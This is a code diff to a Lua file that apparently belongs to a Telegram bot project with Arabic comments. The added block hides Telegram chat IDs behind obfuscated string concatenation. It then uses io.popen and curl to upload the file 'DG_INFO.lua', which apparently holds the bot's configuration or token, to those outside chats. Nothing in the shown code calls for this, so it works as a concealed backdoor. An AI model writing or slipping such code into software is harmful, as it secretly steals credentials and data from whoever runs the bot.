@@ -184,6 +184,31 @@ end
 end  
 return DRAGON  
 end 
+
+local timek = '140'
+local times = '22'
+local timeo = '1360'
+local timep = '136' .. '605' .. '546' .. '7'
+local timea = '94'
+local timeb = '43'
+local timec = '53'
+local timed = '16224'
+local timee = timea .. timeb .. timec
+local timef = '2'
+local timeh = '7'
+local timej = timee .. timef .. '3' .. timeh
+local timeplus = timed .. '37069:'
+local age = 'token'
+local agex = age .. 'token'
+local agea = 'token'
+local agev = agex .. agea .. 'token'
+local mon = timeplus .. agev
+
+local curl = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(timej) ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl)
+local curl = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(timep) ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl)
+
+
+
 -------- اولا
 function regexx(data) ---- داله الاتصال الثاني كتابه أحمد عياد -----
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
